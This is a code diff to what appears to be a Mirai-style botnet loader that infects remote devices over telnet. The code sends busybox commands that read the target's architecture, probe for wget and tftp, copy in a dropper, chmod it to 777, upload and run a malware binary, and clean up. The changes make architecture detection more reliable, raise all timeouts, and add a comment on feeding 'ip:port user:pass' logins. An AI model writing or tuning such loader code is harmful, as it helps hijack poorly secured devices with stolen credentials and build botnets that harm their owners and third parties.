@@ -372,14 +372,21 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             {
                                 conn->state_telnet = TELNET_DETECT_ARCH;
                                 conn->timeout = 120;
+                                /*
+                                 * Dump only the ELF header. Full `cat /bin/echo` on
+                                 * Alpine/LXC sends the whole busybox binary over telnet,
+                                 * which times out and floods the parser with garbage.
+                                 * connection_consume_arch() only needs the "ELF" magic.
+                                 * Shortcut B: stdin `ip:port user:pass x86` skips this.
+                                 */
                                 // DO NOT COMBINE THESE
-                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox head -c 32 /bin/echo\r\n");
                                 util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                             }
                             else
                             {
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
-                                conn->timeout = 15;
+                                conn->timeout = 120;
                                 util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                             }
                         }
@@ -388,7 +395,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         consumed = connection_consume_arch(conn);
                         if (consumed)
                         {
-                            conn->timeout = 15;
+                            conn->timeout = 120;
                             if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                             {
 #ifdef DEBUG
@@ -444,7 +451,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             {
                                 case UPLOAD_ECHO:
                                     conn->state_telnet = TELNET_UPLOAD_ECHO;
-                                    conn->timeout = 30;
+                                    conn->timeout = 120;
                                     util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
 #ifdef DEBUG
                                     printf("echo\n");
@@ -476,7 +483,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
+                            conn->timeout = 120;
 #ifdef DEBUG
                             printf("[FD%d] Finished echo loading!\n", conn->fd);
 #endif
@@ -489,7 +496,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
+                            conn->timeout = 120;
 #ifdef DEBUG
                             printf("[FD%d] Finished wget loading\n", conn->fd);
 #endif
@@ -502,7 +509,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed > 0)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
+                            conn->timeout = 120;
 #ifdef DEBUG
                             printf("[FD%d] Finished tftp loading\n", conn->fd);
 #endif
@@ -518,7 +525,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             conn->state_telnet = TELNET_UPLOAD_ECHO;
                             conn->info.upload_method = UPLOAD_ECHO;
 
-                            conn->timeout = 30;
+                            conn->timeout = 120;
                             util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                         }
                         break;
@@ -555,7 +562,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
 #endif
                             conn->state_telnet = TELNET_CLEANUP;
-                            conn->timeout = 10;
+                            conn->timeout = 120;
                         }
                         break;
                     case TELNET_CLEANUP:
